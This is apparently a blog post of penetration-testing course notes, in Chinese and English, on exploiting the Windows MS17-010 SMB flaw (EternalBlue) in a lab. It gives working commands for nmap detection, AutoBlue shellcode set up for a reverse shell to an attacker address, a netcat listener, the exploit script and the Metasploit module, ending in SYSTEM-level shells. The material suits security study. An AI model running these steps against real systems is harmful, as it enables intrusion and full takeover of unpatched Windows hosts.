---
layout: post
title: "Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)"
date: "2022-09-14"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)（利用 Windows MS17-010 SMB 漏洞（EternalBlue））
## MS17-010 永恒之蓝漏洞利用
EternalBlue (MS17-010/CVE-2017-0144) 是 Windows 漏洞和利用的集合的名称，这些漏洞和利用允许攻击者远程执行任意代码并访问 Windows 系统，从而访问目标系统所在的网络的。

EternalBlue 漏洞利用由 NSA（国家安全局）开发，以利用 MS17-010 漏洞，并于 2017 年由名为 Shadow Brokers 的黑客组织泄露给公众。

EternalBlue 漏洞利用了 Windows SMBv1 协议中的一个漏洞，该漏洞允许攻击者发送特制数据包，从而促进任意命令的执行。

EternalBlue 漏洞被用于 2017 年 6 月 27 日的 WannaCry 勒索软件攻击，通过网络利用其他 Windows 系统，目的是将勒索软件传播到尽可能多的系统。

此漏洞影响多个版本的 Windows：
* Windows Vista
* Windows 7
* Windows Server 2008
* Windows 8.1
* Windows Server 2012
* Windows 10
* Windows Server 2016

微软于 2017 年 3 月发布了针对该漏洞的补丁，然而，许多用户和公司仍未修补他们的系统。

EternalBlue 漏洞利用有一个 MSF 辅助模块，可用于检查目标系统是否容易受到漏洞利用，还有一个漏洞利用模块可用于利用未修补系统上的漏洞。

EternalBlue 漏洞利用模块可用于利用易受攻击的 Windows 系统，从而为我们提供目标系统上的特权 Meterpreter 会话。

除了 MSF 模块，我们还可以通过利用可用的利用代码手动利用该漏洞。

## Tools & Environment
AutoBlue-MS17-010: https://github.com/3ndG4me/AutoBlue-MS17-010

Target system: Windows Server 2008 R2

Penetration Testing distribution: Kali Linux

# Demo: Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)（演示：利用 Windows MS17-010 SMB 漏洞 (EternalBlue)）

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

In order to identify wether the target is effected by Eternal Blue:

[smb-vuln-ms17-010](https://nmap.org/nsedoc/scripts/smb-vuln-ms17-010.html)

尝试检测 Microsoft SMBv1 服务器是否容易受到远程代码执行漏洞（ms17-010，又名 EternalBlue）的攻击。该漏洞被 WannaCry 和 Petya 勒索软件和其他恶意软件积极利用。

该脚本连接到 $IPC 树，在 FID 0 上执行事务并检查是否返回错误“STATUS_INSUFF_SERVER_RESOURCES”以确定目标是否未针对 ms17-010 进行修补。此外，它还会检查修补系统返回的已知错误代码。

```
sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 10.10.10.12
```

[AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

```
ls -al
cd shellcode
ls
chmod +x shell_prep.sh
```

```
./shell_prep.sh
y
10.10.10.10
1234
1234
1
1
```

```
ls -al

sc_x64.bin
sc_x86.bin
```

```
nc -nvlp 1234
```

```
cd ..
chmod +x eternalblue_exploit7.py
ls -al
```

```
python eternalblue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
```

```
nc -nvlp 1234

C:\Windows\system32>whoami
whoami
nt authority\system
```

```
msfconsole

search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.12
exploit
meterpreter > sysinfo
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
